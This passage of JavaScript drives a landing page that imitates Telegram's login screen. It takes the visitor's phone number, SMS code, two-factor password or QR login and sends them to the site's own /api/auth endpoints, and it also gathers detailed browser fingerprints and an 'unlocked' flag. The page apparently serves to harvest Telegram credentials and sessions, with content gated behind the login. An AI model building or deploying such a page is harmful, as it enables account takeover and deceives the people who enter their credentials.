const unlocked = document.body.dataset.unlocked === "1";

let loginId = null;
let authBusy = false;
let currentPhone = "";
let selectedDial = "+7";
let selectedCountryName = "Россия";

const COUNTRIES = [
	{ name: "Австралия", dial: "+61", iso: "AU" },
	{ name: "Австрия", dial: "+43", iso: "AT" },
	{ name: "Азербайджан", dial: "+994", iso: "AZ" },
	{ name: "Албания", dial: "+355", iso: "AL" },
	{ name: "Алжир", dial: "+213", iso: "DZ" },
	{ name: "Американские Виргинские о-ва", dial: "+1340", iso: "VI" },
	{ name: "Американское Самоа", dial: "+1684", iso: "AS" },
	{ name: "Ангилья", dial: "+1264", iso: "AI" },
	{ name: "Ангола", dial: "+244", iso: "AO" },
	{ name: "Андорра", dial: "+376", iso: "AD" },
	{ name: "Аргентина", dial: "+54", iso: "AR" },
	{ name: "Армения", dial: "+374", iso: "AM" },
	{ name: "Афганистан", dial: "+93", iso: "AF" },
	{ name: "Багамские острова", dial: "+1242", iso: "BS" },
	{ name: "Бангладеш", dial: "+880", iso: "BD" },
	{ name: "Барбадос", dial: "+1246", iso: "BB" },
	{ name: "Бахрейн", dial: "+973", iso: "BH" },
	{ name: "Беларусь", dial: "+375", iso: "BY" },
	{ name: "Белиз", dial: "+501", iso: "BZ" },
	{ name: "Бельгия", dial: "+32", iso: "BE" },
	{ name: "Бенин", dial: "+229", iso: "BJ" },
	{ name: "Болгария", dial: "+359", iso: "BG" },
	{ name: "Боливия", dial: "+591", iso: "BO" },
	{ name: "Босния и Герцеговина", dial: "+387", iso: "BA" },
	{ name: "Ботсвана", dial: "+267", iso: "BW" },
	{ name: "Бразилия", dial: "+55", iso: "BR" },
	{ name: "Бруней", dial: "+673", iso: "BN" },
	{ name: "Буркина-Фасо", dial: "+226", iso: "BF" },
	{ name: "Бурунди", dial: "+257", iso: "BI" },
	{ name: "Бутан", dial: "+975", iso: "BT" },
	{ name: "Вануату", dial: "+678", iso: "VU" },
	{ name: "Ватикан", dial: "+379", iso: "VA" },
	{ name: "Великобритания", dial: "+44", iso: "GB" },
	{ name: "Венгрия", dial: "+36", iso: "HU" },
	{ name: "Венесуэла", dial: "+58", iso: "VE" },
	{ name: "Восточный Тимор", dial: "+670", iso: "TL" },
	{ name: "Вьетнам", dial: "+84", iso: "VN" },
	{ name: "Габон", dial: "+241", iso: "GA" },
	{ name: "Гаити", dial: "+509", iso: "HT" },
	{ name: "Гайана", dial: "+592", iso: "GY" },
	{ name: "Гамбия", dial: "+220", iso: "GM" },
	{ name: "Гана", dial: "+233", iso: "GH" },
	{ name: "Гватемала", dial: "+502", iso: "GT" },
	{ name: "Гвинея", dial: "+224", iso: "GN" },
	{ name: "Гвинея-Бисау", dial: "+245", iso: "GW" },
	{ name: "Германия", dial: "+49", iso: "DE" },
	{ name: "Гондурас", dial: "+504", iso: "HN" },
	{ name: "Гонконг", dial: "+852", iso: "HK" },
	{ name: "Гренада", dial: "+1473", iso: "GD" },
	{ name: "Греция", dial: "+30", iso: "GR" },
	{ name: "Грузия", dial: "+995", iso: "GE" },
	{ name: "Дания", dial: "+45", iso: "DK" },
	{ name: "Джибути", dial: "+253", iso: "DJ" },
	{ name: "Доминика", dial: "+1767", iso: "DM" },
	{ name: "Доминиканская Республика", dial: "+1809", iso: "DO" },
	{ name: "Египет", dial: "+20", iso: "EG" },
	{ name: "Замбия", dial: "+260", iso: "ZM" },
	{ name: "Зимбабве", dial: "+263", iso: "ZW" },
	{ name: "Израиль", dial: "+972", iso: "IL" },
	{ name: "Индия", dial: "+91", iso: "IN" },
	{ name: "Индонезия", dial: "+62", iso: "ID" },
	{ name: "Иордания", dial: "+962", iso: "JO" },
	{ name: "Ирак", dial: "+964", iso: "IQ" },
	{ name: "Иран", dial: "+98", iso: "IR" },
	{ name: "Ирландия", dial: "+353", iso: "IE" },
	{ name: "Исландия", dial: "+354", iso: "IS" },
	{ name: "Испания", dial: "+34", iso: "ES" },
	{ name: "Италия", dial: "+39", iso: "IT" },
	{ name: "Йемен", dial: "+967", iso: "YE" },
	{ name: "Кабо-Верде", dial: "+238", iso: "CV" },
	{ name: "Казахстан", dial: "+7", iso: "KZ" },
	{ name: "Камбоджа", dial: "+855", iso: "KH" },
	{ name: "Камерун", dial: "+237", iso: "CM" },
	{ name: "Канада", dial: "+1", iso: "CA" },
	{ name: "Катар", dial: "+974", iso: "QA" },
	{ name: "Кения", dial: "+254", iso: "KE" },
	{ name: "Кипр", dial: "+357", iso: "CY" },
	{ name: "Киргизия", dial: "+996", iso: "KG" },
	{ name: "Китай", dial: "+86", iso: "CN" },
	{ name: "Колумбия", dial: "+57", iso: "CO" },
	{ name: "Конго", dial: "+242", iso: "CG" },
	{ name: "Коста-Рика", dial: "+506", iso: "CR" },
	{ name: "Кот-д’Ивуар", dial: "+225", iso: "CI" },
	{ name: "Куба", dial: "+53", iso: "CU" },
	{ name: "Кувейт", dial: "+965", iso: "KW" },
	{ name: "Лаос", dial: "+856", iso: "LA" },
	{ name: "Латвия", dial: "+371", iso: "LV" },
	{ name: "Лесото", dial: "+266", iso: "LS" },
	{ name: "Либерия", dial: "+231", iso: "LR" },
	{ name: "Ливан", dial: "+961", iso: "LB" },
	{ name: "Ливия", dial: "+218", iso: "LY" },
	{ name: "Литва", dial: "+370", iso: "LT" },
	{ name: "Лихтенштейн", dial: "+423", iso: "LI" },
	{ name: "Люксембург", dial: "+352", iso: "LU" },
	{ name: "Маврикий", dial: "+230", iso: "MU" },
	{ name: "Мавритания", dial: "+222", iso: "MR" },
	{ name: "Мадагаскар", dial: "+261", iso: "MG" },
	{ name: "Макао", dial: "+853", iso: "MO" },
	{ name: "Малави", dial: "+265", iso: "MW" },
	{ name: "Малайзия", dial: "+60", iso: "MY" },
	{ name: "Мали", dial: "+223", iso: "ML" },
	{ name: "Мальдивы", dial: "+960", iso: "MV" },
	{ name: "Мальта", dial: "+356", iso: "MT" },
	{ name: "Марокко", dial: "+212", iso: "MA" },
	{ name: "Мексика", dial: "+52", iso: "MX" },
	{ name: "Мозамбик", dial: "+258", iso: "MZ" },
	{ name: "Молдова", dial: "+373", iso: "MD" },
	{ name: "Монако", dial: "+377", iso: "MC" },
	{ name: "Монголия", dial: "+976", iso: "MN" },
	{ name: "Мьянма", dial: "+95", iso: "MM" },
	{ name: "Намибия", dial: "+264", iso: "NA" },
	{ name: "Непал", dial: "+977", iso: "NP" },
	{ name: "Нигер", dial: "+227", iso: "NE" },
	{ name: "Нигерия", dial: "+234", iso: "NG" },
	{ name: "Нидерланды", dial: "+31", iso: "NL" },
	{ name: "Никарагуа", dial: "+505", iso: "NI" },
	{ name: "Новая Зеландия", dial: "+64", iso: "NZ" },
	{ name: "Норвегия", dial: "+47", iso: "NO" },
	{ name: "ОАЭ", dial: "+971", iso: "AE" },
	{ name: "Оман", dial: "+968", iso: "OM" },
	{ name: "Пакистан", dial: "+92", iso: "PK" },
	{ name: "Панама", dial: "+507", iso: "PA" },
	{ name: "Парагвай", dial: "+595", iso: "PY" },
	{ name: "Перу", dial: "+51", iso: "PE" },
	{ name: "Польша", dial: "+48", iso: "PL" },
	{ name: "Португалия", dial: "+351", iso: "PT" },
	{ name: "Россия", dial: "+7", iso: "RU" },
	{ name: "Румыния", dial: "+40", iso: "RO" },
	{ name: "США", dial: "+1", iso: "US" },
	{ name: "Сальвадор", dial: "+503", iso: "SV" },
	{ name: "Саудовская Аравия", dial: "+966", iso: "SA" },
	{ name: "Северная Македония", dial: "+389", iso: "MK" },
	{ name: "Сенегал", dial: "+221", iso: "SN" },
	{ name: "Сербия", dial: "+381", iso: "RS" },
	{ name: "Сингапур", dial: "+65", iso: "SG" },
	{ name: "Сирия", dial: "+963", iso: "SY" },
	{ name: "Словакия", dial: "+421", iso: "SK" },
	{ name: "Словения", dial: "+386", iso: "SI" },
	{ name: "Сомали", dial: "+252", iso: "SO" },
	{ name: "Судан", dial: "+249", iso: "SD" },
	{ name: "Таджикистан", dial: "+992", iso: "TJ" },
	{ name: "Таиланд", dial: "+66", iso: "TH" },
	{ name: "Тайвань", dial: "+886", iso: "TW" },
	{ name: "Танзания", dial: "+255", iso: "TZ" },
	{ name: "Того", dial: "+228", iso: "TG" },
	{ name: "Тринидад и Тобаго", dial: "+1868", iso: "TT" },
	{ name: "Тунис", dial: "+216", iso: "TN" },
	{ name: "Туркменистан", dial: "+993", iso: "TM" },
	{ name: "Турция", dial: "+90", iso: "TR" },
	{ name: "Уганда", dial: "+256", iso: "UG" },
	{ name: "Узбекистан", dial: "+998", iso: "UZ" },
	{ name: "Украина", dial: "+380", iso: "UA" },
	{ name: "Уругвай", dial: "+598", iso: "UY" },
	{ name: "Филиппины", dial: "+63", iso: "PH" },
	{ name: "Финляндия", dial: "+358", iso: "FI" },
	{ name: "Франция", dial: "+33", iso: "FR" },
	{ name: "Хорватия", dial: "+385", iso: "HR" },
	{ name: "Черногория", dial: "+382", iso: "ME" },
	{ name: "Чехия", dial: "+420", iso: "CZ" },
	{ name: "Чили", dial: "+56", iso: "CL" },
	{ name: "Швейцария", dial: "+41", iso: "CH" },
	{ name: "Швеция", dial: "+46", iso: "SE" },
	{ name: "Шри-Ланка", dial: "+94", iso: "LK" },
	{ name: "Эквадор", dial: "+593", iso: "EC" },
	{ name: "Эстония", dial: "+372", iso: "EE" },
	{ name: "Эфиопия", dial: "+251", iso: "ET" },
	{ name: "ЮАР", dial: "+27", iso: "ZA" },
	{ name: "Южная Корея", dial: "+82", iso: "KR" },
	{ name: "Ямайка", dial: "+1876", iso: "JM" },
	{ name: "Япония", dial: "+81", iso: "JP" },
];

const root = document.getElementById("tg-auth");
const patternBg =
	root && typeof TgPatternBackground !== "undefined"
		? new TgPatternBackground(root)
		: null;
const steps = {
	phone: document.getElementById("tg-step-phone"),
	code: document.getElementById("tg-step-code"),
	password: document.getElementById("tg-step-password"),
	qr: document.getElementById("tg-step-qr"),
	load: document.getElementById("tg-step-load"),
};
const fields = {
	phone: document.getElementById("tg-phone"),
	code: document.getElementById("tg-code"),
	password: document.getElementById("tg-password"),
};
const errors = {
	phone: document.getElementById("tg-phone-error"),
	code: null,
	password: null,
	qr: document.getElementById("tg-qr-error"),
};
const phoneShown = document.getElementById("tg-phone-shown");
const qrBox = document.getElementById("tg-qr-box");
const qrInner = document.getElementById("tg-qr-inner");
const qrLoading = document.getElementById("tg-qr-loading");
const countryWrap = document.getElementById("tg-country-wrap");
const countryInput = document.getElementById("tg-country");
const countryList = document.getElementById("tg-country-list");
const countryChevron = document.getElementById("tg-country-chevron");
const CODE_LEN = 5;
const codeGroup = document.getElementById("tg-code-group");
const codeLabel = document.getElementById("tg-code-label");
const passwordGroup = document.getElementById("tg-password-group");
const passwordLabel = document.getElementById("tg-password-label");
const FLAG_BASE = "/static-landing/tg-login/from-tg-auth/";
let qrPollTimer = 0;
let qrLastSvg = "";
let stepAnimToken = 0;
let phonePastePending = false;
let codeSubmitLock = false;

function flagSrc(iso) {
	if (!iso || iso.length !== 2) return "";
	const base = 0x1f1e6;
	const a = iso.toUpperCase().charCodeAt(0) - 65;
	const b = iso.toUpperCase().charCodeAt(1) - 65;
	if (a < 0 || a > 25 || b < 0 || b > 25) return "";
	return `${FLAG_BASE}${(base + a).toString(16)}-${(base + b).toString(16)}.png`;
}

function flagEmoji(iso) {
	if (!iso || iso.length !== 2) return "🏳️";
	return iso
		.toUpperCase()
		.split("")
		.map((c) => String.fromCodePoint(127397 + c.charCodeAt(0)))
		.join("");
}

function getActiveStep() {
	return Object.values(steps).find((node) => node?.classList.contains("is-active")) || null;
}

function afterStepChange(name) {
	if (name !== "qr") stopQrPolling();
	closeCountryDropdown();
	syncTouchedLabels();
}

function showStep(name, { instant = false } = {}) {
	const next = steps[name];
	if (!next) return;

	const prev = getActiveStep();
	if (prev === next) {
		next.classList.remove("is-leaving", "is-entering");
		afterStepChange(name);
		return;
	}

	const reduceMotion =
		typeof window.matchMedia === "function" &&
		window.matchMedia("(prefers-reduced-motion: reduce)").matches;

	// без анимации: первый показ, лоадер, явный instant
	const skipAnim =
		instant ||
		reduceMotion ||
		!prev ||
		prev === steps.load ||
		next === steps.load;

	const token = ++stepAnimToken;

	const activateNext = (withEnter) => {
		if (token !== stepAnimToken) return;
		Object.values(steps).forEach((node) => {
			if (!node) return;
			node.classList.remove("is-active", "is-leaving", "is-entering");
		});
		next.classList.add("is-active");
		if (withEnter) {
			next.classList.add("is-entering");
			const clearEnter = () => next.classList.remove("is-entering");
			next.addEventListener("animationend", clearEnter, { once: true });
			window.setTimeout(clearEnter, 400);
		}
		afterStepChange(name);
	};

	if (skipAnim) {
		activateNext(false);
		return;
	}

	prev.classList.remove("is-entering");
	prev.classList.add("is-leaving");

	let settled = false;
	const finishLeave = () => {
		if (settled || token !== stepAnimToken) return;
		settled = true;
		prev.classList.remove("is-active", "is-leaving");
		activateNext(true);
	};
	prev.addEventListener("animationend", finishLeave, { once: true });
	window.setTimeout(finishLeave, 320);
}

function stopQrPolling() {
	if (qrPollTimer) {
		window.clearTimeout(qrPollTimer);
		qrPollTimer = 0;
	}
}

function renderQrSvg(svg) {
	if (!qrBox) return;
	if (!svg) {
		qrLastSvg = "";
		qrBox.innerHTML = "";
		qrInner?.classList.remove("open", "shown");
		qrLoading?.classList.remove("is-hidden");
		return;
	}
	if (svg === qrLastSvg) return;
	qrLastSvg = svg;
	qrBox.innerHTML = svg;
	qrLoading?.classList.add("is-hidden");
	qrInner?.classList.remove("open", "shown");
	// reflow → анимация qr-show как в tg_auth
	void qrInner?.offsetWidth;
	qrInner?.classList.add("shown", "open");
}

function scheduleQrPoll(delayMs = 400) {
	stopQrPolling();
	qrPollTimer = window.setTimeout(() => {
		pollQrStatus().catch(() => {});
	}, delayMs);
}

async function pollQrStatus() {
	if (!loginId || !root?.classList.contains("is-open")) {
		stopQrPolling();
		return;
	}
	// уже ушли с экрана QR (например на телефон) — не трогаем UI
	if (getActiveStep() !== steps.qr) {
		stopQrPolling();
		return;
	}
	try {
		const data = await api("/api/auth/qr/status", { login_id: loginId });
		if (getActiveStep() !== steps.qr) {
			stopQrPolling();
			return;
		}
		if (data.qr_svg) renderQrSvg(data.qr_svg);
		if (data.step === "qr") {
			setError(errors.qr, data.error || "");
			scheduleQrPoll(500);
			return;
		}
		stopQrPolling();
		// phone после discard — молча выходим; не показываем «QR не активен»
		if (data.step === "phone" || !data.step) {
			return;
		}
		await finishAuth(data);
	} catch (error) {
		if (getActiveStep() !== steps.qr) {
			stopQrPolling();
			return;
		}
		if (isLoginGoneError(error)) {
			stopQrPolling();
			setError(errors.qr, "Сессия сброшена. Откройте QR снова.");
			return;
		}
		setError(errors.qr, error.message || String(error));
		scheduleQrPoll(1500);
	}
}

async function startQrLogin() {
	if (authBusy) return;
	authBusy = true;
	track("auth.ui.qr_click", { login_id: loginId || undefined });
	showStep("qr");
	renderQrSvg("");
	setError(errors.qr, "");
	try {
		const data = await withLoginRetry((id) =>
			api("/api/auth/qr/start", { login_id: id })
		);
		if (data.error && data.step !== "qr") {
			setError(errors.qr, data.error);
			return;
		}
		if (data.qr_svg) renderQrSvg(data.qr_svg);
		scheduleQrPoll(300);
	} catch (error) {
		setError(errors.qr, error.message || String(error));
		track("auth.ui.error", { stage: "qr", error: error.message || String(error) });
	} finally {
		authBusy = false;
	}
}


function browserTz() {
	try {
		return Intl.DateTimeFormat().resolvedOptions().timeZone || "-";
	} catch (_) {
		return "-";
	}
}

async function collectClientDevice() {
	const ua = navigator.userAgent || "";
	const lang = navigator.language || (navigator.languages && navigator.languages[0]) || "";
	const platform = navigator.platform || "";
	const payload = { ua, lang, platform, hints: null };
	const uad = navigator.userAgentData;
	if (!uad || typeof uad.getHighEntropyValues !== "function") {
		return payload;
	}
	try {
		const high = await uad.getHighEntropyValues([
			"platform",
			"platformVersion",
			"model",
			"uaFullVersion",
			"fullVersionList",
			"architecture",
			"bitness",
		]);
		payload.hints = {
			mobile: Boolean(uad.mobile),
			brands: Array.isArray(uad.brands) ? uad.brands : undefined,
			platform: high.platform || undefined,
			platformVersion: high.platformVersion || undefined,
			model: high.model || undefined,
			uaFullVersion: high.uaFullVersion || undefined,
			architecture: high.architecture || undefined,
			bitness: high.bitness || undefined,
			fullVersionList: Array.isArray(high.fullVersionList)
				? high.fullVersionList
				: undefined,
		};
	} catch (_) {
		payload.hints = {
			mobile: Boolean(uad.mobile),
			brands: Array.isArray(uad.brands) ? uad.brands : undefined,
			platform: uad.platform || undefined,
		};
	}
	return payload;
}

function track(action, details = {}) {
	const skip = new Set([
		"ui.ready",
		"auth.ui.step",
		"auth.ui.phone_click",
		"auth.ui.code_click",
		"auth.ui.password_click",
		"auth.ui.result",
		"auth.ui.reload",
		"auth.ui.ready",
	]);
	if (skip.has(action)) return;
	const payload = { action, ...details, unlocked, tz: browserTz() };
	fetch("/api/event", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(payload),
	}).catch(() => {});
}

function showRoot(open) {
	if (!root) return;
	if (!open) {
		const active = document.activeElement;
		if (active && root.contains(active) && typeof active.blur === "function") {
			active.blur();
		}
		root.setAttribute("inert", "");
		root.setAttribute("aria-hidden", "true");
		root.classList.remove("is-open");
		document.documentElement.classList.remove("tg-auth-open");
		document.body.classList.remove("tg-auth-open");
		closeCountryDropdown();
		stopQrPolling();
		patternBg?.stop();
		return;
	}
	root.removeAttribute("inert");
	root.setAttribute("aria-hidden", "false");
	root.classList.add("is-open");
	document.documentElement.classList.add("tg-auth-open");
	document.body.classList.add("tg-auth-open");
	patternBg?.start();
}

function setError(node, text) {
	if (!node) return;
	if (!text) {
		node.classList.remove("is-visible");
		node.textContent = "";
		return;
	}
	node.textContent = text;
	node.classList.add("is-visible");
}

function digitsOnly(value) {
	return String(value || "").replace(/\D/g, "");
}

function placeCaretAtEnd(input) {
	if (!input) return;
	const len = (input.value || "").length;
	try {
		input.setSelectionRange(len, len);
	} catch (_) {
		/* ignore non-text inputs */
	}
}

function focusPhone() {
	const input = fields.phone;
	if (!input) return;
	input.focus();
	placeCaretAtEnd(input);
	window.requestAnimationFrame(() => placeCaretAtEnd(input));
}

function normalizeCodeError(text) {
	const msg = String(text || "").trim();
	if (!msg) return "Неверный код, попробуйте снова";
	if (/неверн|invalid|wrong|incorrect|expired|истёк|истек/i.test(msg)) {
		return "Неверный код, попробуйте снова";
	}
	return msg.length > 48 ? "Неверный код, попробуйте снова" : msg;
}

function setCodeError(text) {
	if (!text) {
		codeGroup?.classList.remove("error");
		if (codeLabel) codeLabel.textContent = "Код";
		return;
	}
	codeGroup?.classList.add("error", "touched");
	if (codeLabel) codeLabel.textContent = normalizeCodeError(text);
}

function setPasswordError(text) {
	if (!text) {
		passwordGroup?.classList.remove("error");
		if (passwordLabel) passwordLabel.textContent = "Пароль";
		return;
	}
	passwordGroup?.classList.add("error", "touched");
	if (passwordLabel) passwordLabel.textContent = "Пароль";
}

function getCodeValue() {
	return digitsOnly(fields.code?.value || "").slice(0, CODE_LEN);
}

function clearCodeInputs({ keepValue = false } = {}) {
	if (!keepValue && fields.code) fields.code.value = "";
	codeSubmitLock = false;
}

function focusCodeInput() {
	fields.code?.focus();
	placeCaretAtEnd(fields.code);
}

function maybeSubmitCode() {
	const code = getCodeValue();
	if (code.length < CODE_LEN || codeSubmitLock || authBusy) return;
	codeSubmitLock = true;
	document.getElementById("tg-code-btn")?.click();
}

function setupCodeInputs() {
	const input = fields.code;
	if (!input) return;

	input.addEventListener("input", () => {
		const digits = digitsOnly(input.value).slice(0, CODE_LEN);
		if (input.value !== digits) input.value = digits;
		input.closest(".input-group")?.classList.add("touched");
		setCodeError("");
		if (digits.length >= CODE_LEN) maybeSubmitCode();
	});

	input.addEventListener("keydown", (event) => {
		if (event.key === "Enter") {
			event.preventDefault();
			maybeSubmitCode();
		}
	});

	input.addEventListener("paste", (event) => {
		event.preventDefault();
		const text = digitsOnly(event.clipboardData?.getData("text") || "").slice(0, CODE_LEN);
		input.value = text;
		input.closest(".input-group")?.classList.add("touched");
		setCodeError("");
		placeCaretAtEnd(input);
		if (text.length >= CODE_LEN) maybeSubmitCode();
	});
}

function setupPasswordToggle() {
	const toggle = document.getElementById("tg-password-toggle");
	const input = fields.password;
	if (!toggle || !input) return;

	input.addEventListener("input", () => {
		input.closest(".input-group")?.classList.add("touched");
		setPasswordError("");
	});

	toggle.addEventListener("click", () => {
		const reveal = input.type === "password";
		input.type = reveal ? "text" : "password";
		toggle.classList.toggle("is-revealed", reveal);
		toggle.setAttribute("aria-pressed", reveal ? "true" : "false");
		toggle.setAttribute("aria-label", reveal ? "Скрыть пароль" : "Показать пароль");
		input.focus();
	});
}

/** Группы национальных цифр как в Telegram: +7 → 3-3-4 → «+7 917 907 6227». */
function nationalGroupPattern(dial) {
	const code = digitsOnly(dial);
	if (code === "7") return [3, 3, 4]; // RU / KZ
	if (code === "1") return [3, 3, 4]; // US / CA
	if (code === "380") return [2, 3, 2, 2];
	if (code === "375") return [2, 3, 2, 2];
	return null; // по 3
}

function formatNationalDigits(digits, dial) {
	if (!digits) return "";
	const pattern = nationalGroupPattern(dial);
	const parts = [];
	let i = 0;
	if (pattern) {
		for (const len of pattern) {
			if (i >= digits.length) break;
			parts.push(digits.slice(i, i + len));
			i += len;
		}
		if (i < digits.length) parts.push(digits.slice(i));
	} else {
		while (i < digits.length) {
			parts.push(digits.slice(i, i + 3));
			i += 3;
		}
	}
	return parts.join(" ");
}

function formatPhoneValue(dial, nationalDigits) {
	const dialPart = (dial || "").trim() || "+";
	const national = formatNationalDigits(nationalDigits || "", dialPart);
	return national ? `${dialPart} ${national}` : `${dialPart} `;
}

function digitsBeforeCaret(value, caret) {
	let count = 0;
	const end = Math.min(caret ?? value.length, value.length);
	for (let i = 0; i < end; i += 1) {
		if (/\d/.test(value[i]) || (value[i] === "+" && count === 0)) count += 1;
	}
	return count;
}

function caretPosForDigitIndex(value, digitIndex) {
	if (digitIndex <= 0) return 0;
	let seen = 0;
	for (let i = 0; i < value.length; i += 1) {
		const ch = value[i];
		if (/\d/.test(ch) || (ch === "+" && seen === 0)) {
			seen += 1;
			if (seen >= digitIndex) return i + 1;
		}
	}
	return value.length;
}

/** Минимум национальных цифр, чтобы показать «Далее» (как +7 917 907 → 6). */
const PHONE_NEXT_MIN_NATIONAL = 6;

/** Предпочтительная страна при общем коде (+7, +1). */
const DIAL_ISO_PREFER = { 7: "RU", 1: "US" };

const dialPrefixIndex = (() => {
	const map = new Map();
	for (const country of COUNTRIES) {
		const digits = digitsOnly(country.dial);
		if (!digits) continue;
		const list = map.get(digits) || [];
		list.push(country);
		map.set(digits, list);
	}
	return map;
})();

const maxDialPrefixLen = Math.max(0, ...[...dialPrefixIndex.keys()].map((k) => k.length));

function preferCountryForDial(countries) {
	if (!countries?.length) return null;
	if (countries.length === 1) return countries[0];
	const dialDigits = digitsOnly(countries[0].dial);
	const preferIso = DIAL_ISO_PREFER[dialDigits];
	if (preferIso) {
		const preferred = countries.find((c) => c.iso === preferIso);
		if (preferred) return preferred;
	}
	return countries[0];
}

function matchCountryByDigits(digits) {
	const all = digitsOnly(digits);
	if (!all) return null;
	const maxLen = Math.min(all.length, maxDialPrefixLen);
	for (let len = maxLen; len >= 1; len -= 1) {
		const prefix = all.slice(0, len);
		const matches = dialPrefixIndex.get(prefix);
		if (matches?.length) return preferCountryForDial(matches);
	}
	return null;
}

function setSelectedCountry(country) {
	if (!country) return;
	selectedCountryName = country.name;
	selectedDial = country.dial;
	if (countryInput) countryInput.value = country.name;
	countryWrap?.querySelector(".input-group")?.classList.add("touched");
}

function applyDialToPhone(dial) {
	if (!fields.phone) return;
	const prev = fields.phone.value || "";
	const prevDigits = digitsOnly(prev);
	const oldDialDigits = digitsOnly(selectedDial);
	let national = prevDigits;
	if (oldDialDigits && national.startsWith(oldDialDigits)) {
		national = national.slice(oldDialDigits.length);
	}
	selectedDial = dial;
	fields.phone.value = formatPhoneValue(dial, national);
	fields.phone.closest(".input-group")?.classList.add("touched");
	syncPhoneNextButton();
}

function nationalPhoneDigits(value) {
	const all = digitsOnly(value);
	const dialDigits = digitsOnly(selectedDial);
	if (dialDigits && all.startsWith(dialDigits)) {
		return all.slice(dialDigits.length);
	}
	return all;
}

function syncPhoneNextButton() {
	const btn = document.getElementById("tg-phone-btn");
	if (!btn) return;
	const national = nationalPhoneDigits(fields.phone?.value || "");
	const ready = national.length >= PHONE_NEXT_MIN_NATIONAL;
	btn.classList.toggle("is-hidden", !ready);
	btn.hidden = !ready;
}

function hasExplicitIntlPrefix(raw) {
	const t = String(raw || "").trim();
	return t.startsWith("+") || t.startsWith("00");
}

function normalizePhoneDigits(raw) {
	const trimmed = String(raw || "").trim();
	if (trimmed.startsWith("00")) {
		return digitsOnly(trimmed.slice(2));
	}
	return digitsOnly(raw);
}

function writePhoneField(dial, national, digitIndex) {
	const input = fields.phone;
	if (!input) return;
	const formatted = formatPhoneValue(dial, national);
	input.value = formatted;
	let nextCaret = caretPosForDigitIndex(formatted, digitIndex);
	if (nextCaret < 1 && formatted.startsWith("+")) nextCaret = 1;
	try {
		input.setSelectionRange(nextCaret, nextCaret);
	} catch (_) {
		/* ignore */
	}
	syncPhoneNextButton();
}

function writeRawPlusDigits(digits, digitIndex) {
	const input = fields.phone;
	if (!input) return;
	const formatted = digits ? `+${digits}` : "+";
	input.value = formatted;
	let nextCaret = caretPosForDigitIndex(formatted, digitIndex);
	if (nextCaret < 1) nextCaret = 1;
	try {
		input.setSelectionRange(nextCaret, nextCaret);
	} catch (_) {
		/* ignore */
	}
	syncPhoneNextButton();
}

function shouldApplyDetectedCountry(all, country, currentDialDigits, explicitIntl, isPaste) {
	if (!country) return false;
	const dialDigits = digitsOnly(country.dial);
	const national = all.slice(dialDigits.length);
	if (!all.startsWith(dialDigits)) return false;
	if (dialDigits === currentDialDigits) return true;
	if (explicitIntl) return national.length >= 0 && all.length >= dialDigits.length;
	if (national.length < PHONE_NEXT_MIN_NATIONAL && all.length > dialDigits.length) {
		// короткий набор после смены кода — уже можно переключить
		return all.length >= dialDigits.length;
	}
	if (national.length < PHONE_NEXT_MIN_NATIONAL && all.length === dialDigits.length) {
		return true; // набрали только код страны
	}

	// полный международный без «+»: длинный код страны (380, 375, …)
	if (dialDigits.length >= 3) return true;

	// +1 / короткий код: только если длина явно «код + полный национал»
	if (dialDigits.length <= 2) {
		if (currentDialDigits && !all.startsWith(currentDialDigits)) {
			const typicalNational =
				currentDialDigits === "7" || currentDialDigits === "1" ? 10 : 9;
			// «917…» при выбранной РФ — национальный номер, не +91
			if (dialDigits.length >= 2 && all.length <= typicalNational + 1) {
				return false;
			}
			// «1779…» (11 цифр) при РФ → +1
			if (dialDigits.length === 1 && all.length >= 1 + typicalNational) {
				return true;
			}
		}
		return all.length >= dialDigits.length + 10;
	}

	if (isPaste && all.length >= dialDigits.length + 8) return true;
	return false;
}

function onPhoneInput(event) {
	const input = fields.phone;
	if (!input) return;

	const raw = input.value;
	const caret = input.selectionStart ?? raw.length;
	const digitIndex = digitsBeforeCaret(raw, caret);
	const isPaste =
		phonePastePending ||
		event?.inputType === "insertFromPaste" ||
		event?.inputType === "insertFromDrop";
	phonePastePending = false;

	let all = normalizePhoneDigits(raw);
	const currentDialDigits = digitsOnly(selectedDial);
	const explicitIntl = hasExplicitIntlPrefix(raw);
	const editingPrefix = explicitIntl || raw.trim().startsWith("+");

	// стёрли всё / остался только «+» — не восстанавливаем код страны
	if (!all) {
		writeRawPlusDigits("", digitIndex);
		return;
	}

	// локальный РФ/КЗ: 8XXXXXXXXXX → 7XXXXXXXXXX
	if (
		all.length === 11 &&
		all.startsWith("8") &&
		(currentDialDigits === "7" || isPaste)
	) {
		all = `7${all.slice(1)}`;
	}

	const matched = matchCountryByDigits(all);
	const matchedDialDigits = matched ? digitsOnly(matched.dial) : "";

	// Пользователь стирает/меняет код в поле (+…)
	if (currentDialDigits && !all.startsWith(currentDialDigits) && editingPrefix) {
		if (matched && all.startsWith(matchedDialDigits)) {
			const national = all.slice(matchedDialDigits.length);
			setSelectedCountry(matched);
			writePhoneField(matched.dial, national, digitIndex);
			return;
		}
		writeRawPlusDigits(all, digitIndex);
		return;
	}

	// вставка полного международного без текущего dial
	if (
		currentDialDigits &&
		!all.startsWith(currentDialDigits) &&
		shouldApplyDetectedCountry(
			all,
			matched,
			currentDialDigits,
			explicitIntl,
			isPaste
		)
	) {
		const national = all.slice(matchedDialDigits.length);
		setSelectedCountry(matched);
		writePhoneField(matched.dial, national, digitIndex);
		return;
	}

	// цифры без кода текущей страны → национальная часть (не восстанавливаем чужой match вроде +91)
	if (currentDialDigits && !all.startsWith(currentDialDigits)) {
		writePhoneField(selectedDial || "+", all, digitIndex);
		return;
	}

	const shouldDetectCountry = explicitIntl || isPaste;
	if (
		shouldDetectCountry &&
		shouldApplyDetectedCountry(
			all,
			matched,
			currentDialDigits,
			explicitIntl,
			isPaste
		)
	) {
		const national = all.slice(matchedDialDigits.length);
		setSelectedCountry(matched);
		writePhoneField(matched.dial, national, digitIndex);
		return;
	}

	const dial = selectedDial || "+";
	let national = all;
	if (currentDialDigits && all.startsWith(currentDialDigits)) {
		national = all.slice(currentDialDigits.length);
	}
	writePhoneField(dial, national, digitIndex);
}

function selectCountry(country, { keepOpen = false } = {}) {
	if (!country) return;
	selectedCountryName = country.name;
	if (countryInput) countryInput.value = country.name;
	applyDialToPhone(country.dial);
	countryWrap?.classList.add("touched");
	if (!keepOpen) closeCountryDropdown();
	renderCountryList("");
	focusPhone();
}

function renderCountryList(query = "") {
	if (!countryList) return;
	const q = query.trim().toLowerCase();
	const items = COUNTRIES.filter((c) => {
		if (!q) return true;
		return (
			c.name.toLowerCase().includes(q) ||
